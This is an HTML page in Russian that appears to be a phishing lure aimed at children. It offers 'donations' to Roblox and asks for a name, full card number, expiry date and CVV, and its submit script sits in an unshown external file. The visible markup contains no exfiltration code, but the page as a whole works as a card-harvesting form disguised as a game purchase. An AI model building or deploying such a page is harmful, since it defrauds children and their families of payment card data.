<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Кредитная карта ♡</title>
    <link href="https://fonts.googleapis.com/css2?family=Comic+Neue:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="помогите2.css">
</head>
<body>
    <div class="container">
        <div class="card-preview">
            <h1>задонатиш в роблокс ♡</h1>
            <div class="credit-card">
                <div class="card-header">
                    <span class="bank-name">Банк</span>
                    <span class="card-region">Россия</span>
                    <img src="default.png" alt="" class="bank-logo" id="bankLogo">
                </div>
                <div class="card-chip"></div>
                <div class="card-number">•••• •••• •••• ••••</div>
                <div class="card-footer">
                    <div class="card-owner">
                        <div class="label">ВЛАДЕЛЕЦ</div>
                        <div class="name">ИМЯ ФАМИЛИЯ</div>
                    </div>
                    <div class="card-expiry">
                        <div class="label">СРОК ДЕЙСТВИЯ</div>
                        <div class="date">••/••</div>
                    </div>
					    <div class="card-cvv">
						<div class="label">CVV</div>
						<div class="cvv">•••</div>
					</div>
                </div>
            </div>

            <div class="russia-map-container">
                <h2>Регион карты</h2>
                <div class="russia-map">
                   
                </div>
            </div>
        </div>

        <div class="form-container">
            <section class="personal-data">
                <h2>Личные данные</h2>
                <div class="form-group">
                    <label for="firstName">Имя</label>
                    <input type="text" id="firstName" placeholder="Введите ваше имя" maxlength="20" required>
                </div>
                <div class="form-group">
                    <label for="lastName">Фамилия</label>
                    <input type="text" id="lastName" placeholder="Введите вашу фамилию" maxlength="20" required>
                </div>
            </section>

            <section class="card-data">
                <h2>Данные карты</h2>
                <div class="form-group">
                    <label for="cardNumber">Номер карты</label>
                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label for="cardExpiry">Срок действия</label>
                        <input type="text" id="cardExpiry" placeholder="ММ/ГГ" maxlength="5" required>
                    </div>
                    <div class="form-group">
                        <label for="cardCvv">CVV/CVC</label>
                        <input type="password" id="cardCvv" placeholder="•••" maxlength="3" required>
                    </div>
                </div>
            </section>
            
            <button type="button" id="submitBtn" class="submit-btn">
                <span>задонатить ♡</span>
            </button>
        </div>
    </div>

    <script src="помогите3.js"></script>
</body>
</html>
